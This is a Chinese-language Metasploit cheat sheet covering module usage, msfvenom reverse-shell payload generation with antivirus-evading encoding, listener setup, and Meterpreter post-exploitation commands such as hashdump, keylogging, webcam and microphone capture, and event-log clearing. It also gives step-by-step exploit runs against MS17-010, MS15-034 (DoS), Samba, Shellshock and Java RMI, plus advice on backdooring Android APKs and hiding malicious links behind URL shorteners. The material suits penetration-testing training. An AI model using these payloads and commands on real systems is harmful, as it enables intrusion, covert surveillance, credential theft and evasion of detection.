### 1. MSF 简单介绍

#### 核心概念
1.  **Payload（攻击荷载）**:
    *   定义: 攻击成功后在目标主机执行的代码.
    *   存储: MSF 主目录下的 `payloads` 文件夹.
2.  **Shellcode（溢出代码）**:
    *   定义: 攻击时执行的机器指令，通常用汇编编写.
    *   作用: 触发后提供 shell 或 Meterpreter.
3.  **Module（模块）**:
    *   定义: MSF 中的代码组件.
    *   类型:
        *   `exploits`: 漏洞利用模块.
        *   `auxiliary`: 辅助模块（如扫描、嗅探、Fuzzing、服务发现等）.
        *   `encoders`: 编码模块，用于混淆 Payload 躲避检测.
        *   `payloads`: 荷载模块，定义攻击成功后执行的代码.
        *   `post`: 后渗透模块，用于在获得访问权限后进行信息收集、提权等操作.
        *   `nops`: NOP 生成器，用于填充缓冲区.
    *   存储: `modules` 目录.

### 2. MSF 基础命令与工作流程

#### 常用命令
*   `msfconsole`: 启动 MSF 交互式控制台.
*   `help`: 查看帮助菜单或特定命令的帮助 (`help search`).
*   `search <关键字>`: 按关键字搜索模块.
    *   Example: `search ms17-010`, `search type:auxiliary portscan`.
*   `use <模块路径或ID>`: 选择并进入一个模块.
    *   Example: `use exploit/windows/smb/ms17_010_eternalblue`, `use 0`.
*   `info`: 查看当前模块的详细信息、选项和描述.
*   `show options`: 查看当前模块需要配置的参数.
*   `show payloads`: 查看当前 `exploit` 模块兼容的所有 Payload.
*   `set <配置名> <值>`: 设置模块所需的参数.
    *   Example: `set RHOSTS 192.168.1.100`, `set PAYLOAD windows/meterpreter/reverse_tcp`.
*   `setg <配置名> <值>`: 设置一个全局参数，适用于所有模块 (e.g., `setg LHOST 192.168.1.5`).
*   `unset <配置名>`: 取消单个参数的设置.
*   `unset all`: 取消所有已设置的参数.
*   `exploit` or `run`: 执行当前模块（`exploit` 用于 `exploit` 模块，`run` 通常用于 `auxiliary` 和 `post` 模块）.
*   `exploit -z`: 执行漏洞利用并将建立的会话立即放入后台.
*   `back`: 返回上一级，退出当前模块上下文.
*   `sessions`: 列出所有活动的后台会话.
*   `sessions -i <ID>`: 与指定的会话进行交互.
*   `sessions -k <ID>`: 终止指定的会话.
*   `kill <任务ID>`: 终止一个正在运行的 MSF 任务.
*   `jobs`: 查看后台正在运行的任务.
*   `load <模块名>`: 加载插件或模块.
*   `unload <模块名>`: 卸载插件或模块.
*   `reload_all`: 重载所有模块，用于更新模块缓存.
*   `history`: 查看在 `msfconsole` 中执行过的命令历史.
*   `ping <IP>`: 在 `msfconsole` 内部执行 ping 命令检测网络连通性.
*   `ls`, `cd`, etc.: 支持许多标准的 Linux shell 命令.
*   `exit`: 退出 MSF 控制台.

#### 导入自定义模块
1.  **下载模块**:
    ```bash
    git clone <CVE模块URL>
    # Or manually download the .rb file
    ```
2.  **导入**:
    *   将 `.rb` 文件放入 `~/.msf4/modules/` 下对应的目录结构中（如 `~/.msf4/modules/exploits/windows/smb/my_exploit.rb`）。如果 `~/.msf4` 目录不存在，MSF 首次启动时通常会创建。
    *   确保模块代码格式兼容 MSF.
    *   运行 `reload_all` 命令使新模块生效.

### 3. MSF 数据库集成

*   **目的**: 存储扫描结果、主机信息、凭证等，方便管理和复用数据.
*   **启动数据库服务** (通常是 PostgreSQL):
    ```bash
    sudo systemctl start postgresql
    ```
*   **初始化数据库** (首次使用时):
    ```bash
    msfdb init
    ```
*   **检查数据库连接状态** (在 `msfconsole` 内):
    ```
    db_status
    ```
*   **工作区管理**: 用于隔离不同项目的数据.
    *   `workspace`: 列出所有工作区.
    *   `workspace -a <工作区名>`: 添加新工作区.
    *   `workspace -d <工作区名>`: 删除工作区.
    *   `workspace <工作区名>`: 切换到指定工作区.
    *   `workspace -h`: 查看工作区相关命令帮助.
*   **数据库 Nmap 扫描**:
    ```
    db_nmap -sV -p- <目标IP> # Example: Scan target and save results to DB
    ```
*   **查看数据库数据**:
    *   `hosts`: 列出数据库中的主机信息.
    *   `services`: 列出数据库中的服务信息.
    *   `vulns`: 列出发现的漏洞.
    *   `creds`: 列出获取到的凭证.
*   **应用数据库数据**:
    *   `hosts -R`: 将数据库中当前工作区的所有主机设置为 RHOSTS.

### 4. MSF 模块详解

#### Exploits 模块
*   **命名规则**: `平台/服务/名称` (e.g., `windows/smb/ms17_010_eternalblue`).
*   **常用配置**:
    *   `RHOST` / `RHOSTS`: 目标 IP / 目标 IP 范围或列表.
    *   `RPORT`: 目标端口.
    *   `PAYLOAD`: 选择使用的攻击荷载.
    *   `LHOST`: 攻击者 IP (用于反向连接).
    *   `LPORT`: 攻击者监听端口 (用于反向连接).
    *   `TARGET`: 有些模块需要指定具体的目标系统类型或版本.

#### Payloads 模块
*   **命名规则**: `平台/类型/名称` (e.g., `windows/meterpreter/reverse_tcp`).
*   **类型**:
    *   **Inline**: 单一的、完整的 Payload，体积较大，但可能更稳定.
    *   **Staged**: 先发送一个小型的 Stager，连接成功后再下载并执行最终的 Stage (Payload)。更隐蔽，但需要网络连接。.
        *   `reverse_*`: 目标主动连接攻击者.
        *   `bind_*`: 攻击者主动连接目标（目标监听端口）.
    *   **Meterpreter**: 高级、多功能的内存驻留 Payload，提供强大的后渗透能力.
    *   **Shell**: 提供标准的命令行 Shell.
    *   **VNCInject**: 注入 VNC 服务，提供图形界面访问.
    *   *其他类型*: 如 `patchup`, `upexec`, `dllinject`, `passive` 等.

#### Auxiliary 模块
*   **作用**: 执行扫描、嗅探、拒绝服务 (DoS)、服务发现、版本探测等非直接利用漏洞的操作.
*   **常用示例**:
    *   `auxiliary/scanner/portscan/tcp`: TCP 端口扫描.
    *   `auxiliary/scanner/discovery/udp_sweep`: 快速识别 UDP 服务.
    *   `auxiliary/scanner/smb/smb_version`: 扫描 SMB 版本.
    *   `auxiliary/server/capture/ftp`: 搭建假的 FTP 服务器捕获凭证.
    *   `auxiliary/admin/smb/ms17_010_command`: 通过 MS17-010 执行命令（若已有 DoublePulsar 后门）.

#### Post 模块
*   **作用**: 在获得目标系统访问权限（如 Meterpreter 或 Shell 会话）后执行.
*   **功能**: 信息收集、权限提升、持久化、内网漫游等.
*   **使用**: 在会话 (Session) 中使用 `run <post_module_name>` 或 `run post/windows/gather/checkvm`.

### 5. MSFvenom - Payload 生成与编码

*   **用途**: 独立于 `msfconsole` 的 Payload 生成器和编码器.
*   **常用命令**:
    *   `msfvenom -l payloads`: 列出所有可用的 Payload.
    *   `msfvenom -l formats`: 列出所有支持的输出格式.
    *   `msfvenom -l encoders`: 列出所有可用的编码器.
    *   **生成 Payload**:
        ```bash
        # Windows Reverse TCP Meterpreter EXE
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<你的端口> -f exe -o rev_shell.exe

        # Linux Reverse TCP Meterpreter ELF
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<你的端口> -f elf -o rev_shell.elf

        # PHP Reverse TCP Meterpreter Raw (for web shells)
        msfvenom -p php/meterpreter_reverse_tcp LHOST=<你的IP> LPORT=<你的端口> -f raw -o rev_shell.php
        # 注意: 可能需要手动调整生成的 PHP 代码以适应目标环境

        # ASP Reverse TCP Meterpreter
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<你的端口> -f asp -o rev_shell.asp

        # Python Reverse Shell Raw
        msfvenom -p cmd/unix/reverse_python LHOST=<你的IP> LPORT=<你的端口> -f raw -o rev_shell.py

        # 生成带编码的 Payload
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe

        # 编码现有 Payload
        msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=4444 -f raw -e php/base64 -o encoded_payload.txt
        ```

### 6. Multi/Handler - 监听器

*   **用途**: 配合生成的 Payload（尤其是反向连接类型）使用，用于接收来自目标的回连并建立会话.
*   **使用方法**:
    ```
    use exploit/multi/handler
    set PAYLOAD <与生成时相同的Payload>  # e.g., windows/meterpreter/reverse_tcp
    set LHOST <监听IP>                  # e.g., 0.0.0.0 or your specific IP
    set LPORT <监听端口>                  # e.g., 4444
    exploit -j                          # -j runs the listener as a background job
    ```

### 7. Meterpreter - 高级后渗透 Shell

*   **获取**: 通常通过 `meterpreter/*` 类型的 Payload 获得.
*   **常用命令** (在 Meterpreter 会话中输入 `help` 查看完整列表):

    #### Core 命令
    *   `background`: 将当前 Meterpreter 会话放入后台.
    *   `exit` / `quit`: 终止当前 Meterpreter 会话.
    *   `guid`: 获取会话的全局唯一标识符.
    *   `help`: 显示帮助菜单.
    *   `info`: 显示关于后渗透模块的信息.
    *   `irb`: 打开交互式 Ruby Shell.
    *   `load`: 加载 Meterpreter 扩展.
    *   `migrate <PID>`: 将 Meterpreter 迁移到另一个进程以提高隐蔽性或稳定性.
    *   `run <脚本名>` or `run <post_module>`: 执行 Meterpreter 脚本或后渗透模块.
    *   `sessions`: 快速切换到另一个会话.

    #### 文件系统命令
    *   `cd <目录>`: 更改目录.
    *   `ls` / `dir`: 列出当前目录内容.
    *   `pwd`: 打印当前工作目录.
    *   `edit <文件>`: 编辑文件.
    *   `cat <文件>`: 显示文件内容.
    *   `rm <文件>`: 删除文件.
    *   `search -f <文件名模式>`: 搜索文件 (e.g., `search -f *.doc`).
    *   `upload <本地文件> <远程路径>`: 上传文件到目标.
    *   `download <远程文件> <本地路径>`: 从目标下载文件.

    #### 网络命令
    *   `arp`: 显示目标 ARP 缓存.
    *   `ifconfig` / `ipconfig`: 显示网络接口信息.
    *   `netstat`: 显示网络连接.
    *   `portfwd add -l <本地端口> -p <远程端口> -r <远程IP>`: 创建端口转发.
    *   `route`: 查看和修改路由表.

    #### 系统命令
    *   `clearev`: 清除事件日志.
    *   `execute -f <程序> [-a <参数>]`: 执行程序.
    *   `getpid`: 显示 Meterpreter 当前所在进程的 PID.
    *   `getuid`: 显示 Meterpreter 当前运行的用户身份.
    *   `kill <PID>`: 终止指定 PID 的进程.
    *   `pkill <进程名>`: 按名称终止进程.
    *   `ps`: 列出正在运行的进程.
    *   `reboot`: 重启目标计算机.
    *   `shell`: 进入目标系统的标准命令行 Shell.
    *   `shutdown`: 关闭目标计算机.
    *   `sysinfo`: 获取目标系统信息.
    *   `getsystem`: 尝试提升到 SYSTEM 权限.

    #### 其他命令
    *   `hashdump`: 转储 SAM 数据库中的密码哈希.
    *   `idletime`: 显示用户空闲时间.
    *   `keyscan_start`: 开始键盘记录.
    *   `keyscan_dump`: 转储键盘记录缓冲区.
    *   `keyscan_stop`: 停止键盘记录.
    *   `screenshot`: 截取屏幕截图.
    *   `screenshare`: 实时查看远程桌面.
    *   `record_mic`: 录制麦克风音频.
    *   `webcam_list`: 列出可用的网络摄像头.
    *   `webcam_snap`: 从摄像头拍照.
    *   `webcam_stream`: 从摄像头播放视频流.

### 8. 特定漏洞利用示例

#### MS17-010
*   **描述**: SMBv1 远程代码执行漏洞.
*   **流程**:
    1.  **启动 MSF**: `msfconsole`
    2.  **(可选) 扫描漏洞**:
        ```
        use auxiliary/scanner/smb/smb_ms17_010
        set RHOSTS <Target_IP_Range>
        run
        ```
    3.  **选择利用模块**:
        ```
        use exploit/windows/smb/ms17_010_eternalblue
        # Or use exploit/windows/smb/eternalblue_doublepulsar if DoublePulsar needed/present
        ```
    4.  **设置参数**:
        ```
        set RHOSTS <Target_IP>
        set PAYLOAD windows/x64/meterpreter/reverse_tcp # Adjust x86/x64 as needed
        set LHOST <Your_IP>
        set LPORT 4444
        # Sometimes needed: set PROCESSINJECT explorer.exe
        ```
    5.  **执行攻击**: `exploit`
    6.  **结果**: 成功则获得 Meterpreter 会话.

#### MS15-034
*   **描述**: HTTP.sys 处理畸形 Range 请求头时存在漏洞，主要导致 DoS，特定条件下可能 RCE.
*   **原理**: 发送包含超大范围值的 `Range: bytes=0-18446744073709551615` 请求头.
*   **流程**:
    1.  **环境**: Target running Windows with IIS enabled, *without* patch KB3042553.
    2.  **探测**:
        ```bash
        # Using curl
        curl -v http://<Target_IP>/ -H "Host: test" -H "Range: bytes=0-18446744073709551615"
        # Vulnerable: Returns "Requested Range Not Satisfiable" (416)
        # Patched: Returns "Bad Request" (400) or other error
        ```
        *   Or use MSF Scanner:
            ```
            use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
            set RHOSTS <Target_IP>
            run
            ```
    3.  **DoS 攻击**:
        ```
        use auxiliary/dos/http/ms15_034_ulonglongadd
        set RHOSTS <Target_IP>
        run
        ```
    4.  **结果**: 未打补丁的系统可能蓝屏或服务崩溃.

#### Linux Samba 低版本漏洞
*   **描述**: 较早的 Samba 版本存在多个漏洞，如 `is_known_pipename` (CVE-2017-7494) 或更早的命令执行漏洞。
*   **流程**:
    1.  **探测**:
        ```bash
        nmap -p 139,445 --script smb-vuln* <Target_IP>
        # Or use MSF:
        use auxiliary/scanner/smb/smb_version
        set RHOSTS <Target_IP>
        run
        ```
    2.  **利用** (Example: CVE-2017-7494):
        ```
        use exploit/linux/samba/is_known_pipename
        set RHOSTS <Target_IP>
        set LHOST <Your_IP>
        # Set Payload if needed (often defaults to cmd/unix/reverse_netcat)
        exploit
        ```
    3.  **优化 Shell** (If you get a basic shell):
        ```bash
        python -c 'import pty; pty.spawn("/bin/bash")'
        # Or: python3 -c 'import pty; pty.spawn("/bin/bash")'
        # Or: script /dev/null -c bash
        ```

#### Shellshock
*   **描述**: Bash 处理环境变量时存在缺陷 (CVE-2014-6271, CVE-2014-6278)，可通过 CGI 等途径触发远程命令执行.
*   **流程**:
    1.  **探测**: Use specialized scanners or manual tests targeting CGI scripts.
    2.  **利用** (Example: Apache mod_cgi):
        ```
        use exploit/multi/http/apache_mod_cgi_bash_env_exec
        set RHOSTS <Target_IP>
        set TARGETURI /path/to/vulnerable.cgi
        set LHOST <Your_IP>
        # Configure payload (e.g., linux/x86/meterpreter/reverse_tcp)
        exploit
        ```

#### Java RMI Server Deserialization
*   **描述**: Java RMI 注册表或服务在处理反序列化数据时可能存在漏洞，导致 RCE.
*   **流程**:
    1.  **探测**:
        ```bash
        nmap -p 1099 --script rmi-dumpregistry <Target_IP> # Port 1099 is common for RMI registry
        ```
    2.  **利用** (Generic RMI Server Exploit):
        ```
        use exploit/multi/misc/java_rmi_server
        set RHOSTS <Target_IP>
        set RPORT 1099 # Adjust if non-default
        set LHOST <Your_IP>
        # Choose appropriate payload
        exploit
        ```

### 9. 高级技巧与其他

*   **Android 木马免杀**:
    *   **工具**: `backdoor-apk`, `Apktool`.
    *   **原理**: 将 MSF 生成的 Android Payload 注入到正常的 APK 文件中，再重新打包签名，以绕过一些简单的检测.
    *   **步骤**: Generally involves using `msfvenom` to create the payload, `apktool` to decompile the target APK, manually inserting payload/smali code, and then recompiling/signing using `apktool` and signing tools. The `backdoor-apk` script automates parts of this.
*   **隐藏链接**: 使用 URL 短链服务 (e.g., TinyURL) 隐藏指向恶意 Payload 或钓鱼页面的链接.
*   **沙箱分析**: 使用在线沙箱（如微步在线、VirusTotal、Hybrid Analysis）分析生成的 Payload 或可疑文件的行为.